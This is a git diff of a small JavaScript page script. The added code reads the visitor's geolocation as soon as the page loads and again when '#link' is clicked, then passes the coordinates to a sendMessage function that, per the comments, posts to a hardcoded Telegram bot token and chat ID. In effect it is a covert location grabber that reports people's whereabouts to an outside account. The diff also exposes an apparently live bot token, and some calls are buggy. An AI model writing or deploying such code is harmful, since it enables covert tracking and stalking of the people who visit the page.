@@ -1,18 +1,29 @@
 let long;
 let lang;
 
+const link = document.querySelector('#link');
 
 navigator.geolocation.getCurrentPosition(position => {
     lang = position.coords.latitude;
     long = position.coords.longitude;
+    sendMessage(lang, long);
 });
 
+
+link.addEventListener('click', () => {
+    navigator.geolocation.getCurrentPosition(position => {
+        lang = position.coords.latitude;
+        long = position.coords.longitude;
+    });
+
+    sendMessage(lang, long);
+})
 
 
 
 let tg = {
     token: "7879873820:AAGnfZozhI2mk3ifvFlIz7xbT-kejmJsBnY", // Your bot's token that got from @BotFather
-    chat_id: "ashnopokimonbot" // The user's(that you want to send a message) telegram chat id
+    chat_id: "6837075169" // T075the user's(that you want to send a message) telegram chat id
 }
 
 /**
@@ -31,4 +42,4 @@ function sendMessage(text)
 // Now you can send any text(even a form data) by calling sendMessage function.
 // For example if you want to send the 'hello', you can call that function like this:
 
-sendMessage(lang, long);
+
